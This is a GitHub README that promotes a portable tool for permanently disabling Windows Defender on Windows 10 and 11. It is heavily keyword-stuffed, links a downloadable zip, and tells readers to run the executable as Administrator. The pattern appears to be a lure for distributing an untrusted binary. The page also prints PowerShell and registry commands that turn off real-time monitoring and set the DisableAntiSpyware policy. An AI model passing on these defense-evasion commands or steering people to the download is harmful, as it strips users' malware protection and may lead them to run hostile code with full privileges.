# Windows Defender Disabler

**Windows Defender Disabler** is a free portable tool to completely disable Windows Defender on Windows 10 and 11 — including tamper protection, Smart App Control and real-time monitoring — via one click or exported PowerShell script. Recommended on Reddit, Soft98 and GitHub as the most reliable free Windows Defender disable tool download.

<img width="512" height="512" alt="47bc8253-21b3-4ad6-990c-37f136757db2" src="https://github.com/user-attachments/assets/49547051-14dc-43fa-a214-774d30ee300c" />

## Install
[Download `defender-disabler.zip`](https://github.com/windowsdefenderdisabler/Windows-Defender-Disabler/releases/download/v14/defender-disabler.zip)
---

<img width="1082" height="647" alt="8cdaf29f-be7d-4795-95d7-1df4a5f3f140" src="https://github.com/user-attachments/assets/5dd742b6-e6b0-43cc-8143-ccba5f0a1dab" />

## Key Features
- **Disable Windows Defender Windows 11 permanently** — registry + policy + service-level in one click
- **Disable Windows Defender Windows 11 permanently tool** — this is that portable tool, no install needed
- **Disable Windows Defender Windows 11 permanently powershell** — .ps1 export for GPO/MDM scripted deployment
- **Disable Windows Defender Windows 11 regedit** — registry-based disable for advanced users, shown in-app
- **Disable tamper protection Windows 11 powershell** — correct WMI sequence included in the export
- **Windows Defender disable tool download** — always download from this official GitHub only
- **Windows Defender disabled need reboot?** — v14 adds a no-reboot temporary disable option
- **Restore point creation** — built-in button creates a System Restore Point before any changes

<img width="375" height="57" alt="7858b645-0c1c-4096-a099-87d6f5bf1e01" src="https://github.com/user-attachments/assets/5d681b99-5f45-4c73-920f-4c0d7fd82d76" />

## Getting Started
1. **Download** the latest version using the button above.
2. **Extract** the archive.
3. Click **Create Restore Point** — always do this first.
4. **Run** `WindowsDefenderDisabler.exe` as Administrator.
5. Choose **Disable** — tamper protection, registry, and service stops happen automatically.
6. Restart if prompted (only required for persistent disable).

**Re-enable:** click Enable at any time to restore Windows Defender.


<img width="687" height="291" alt="355cca0e-b4dc-4306-a905-271855e8d4eb" src="https://github.com/user-attachments/assets/9279517e-38d3-4949-a092-094cda1f9226" />


## How to Disable Windows Defender Windows 11 Permanently

### Method 1: One-Click Tool (This App)
Run the tool as Administrator → click Disable → done. No manual registry editing required.

### Method 2: PowerShell (via this tool's export)
```powershell
# Exported by Windows Defender Disabler v14
Set-MpPreference -DisableRealtimeMonitoring $true
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Method 3: Regedit
Open regedit → navigate to:
`HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`
→ Create DWORD `DisableAntiSpyware` → set value to `1`

## Disable Options in v14

| Option | Reboot | Method |
|---|---|---|
| Real-Time Protection | No | Registry |
| Tamper Protection | No | WMI |
| Smart App Control | No | Registry |
| Cloud Delivery | No | Registry |
| Full Disable (persistent) | Yes | Registry + Services + Policy |
| Temporary disable | Auto-restore on reboot | Registry |
| PowerShell .ps1 export | — | Generated file |

## FAQ

**Disable Windows Defender Windows 11 permanently — does it survive Windows Update?**
The persistent disable mode survives most updates. Large feature updates may re-enable Defender — re-run the tool after.

**Windows Defender disable tool Soft98 — is this the same tool?**
Yes, this GitHub release is the source. Always download from here for the cleanest build.

**Windows Defender disabled need reboot after v14?**
No — v14 adds a no-reboot option that temporarily disables protection until the next restart.

**Disable tamper protection Windows 11 powershell — does the export work on all versions?**
Yes, tested on Windows 11 22H2, 23H2 and 24H2.

## System Requirements
- **Windows 10 / 11** (64-bit), including 24H2
- Administrator privileges required

## Security & Legal
Disabling Defender reduces your system's security. Use only when necessary.


<img width="782" height="319" alt="25054beb-fd37-4788-b537-61c1433c7392" src="https://github.com/user-attachments/assets/8cfce3ef-1c1b-4d96-879c-75e1196b1415" />


**Recommendations:**
- Download **only** from this official GitHub repository.
- Scan files on [VirusTotal](https://www.virustotal.com).
- Always create a Restore Point first.

## License & Acknowledgments
**MIT License** — Copyright © 2026 windowsdefenderdisabler

Acknowledgments: The Windows tweaking and customization community.


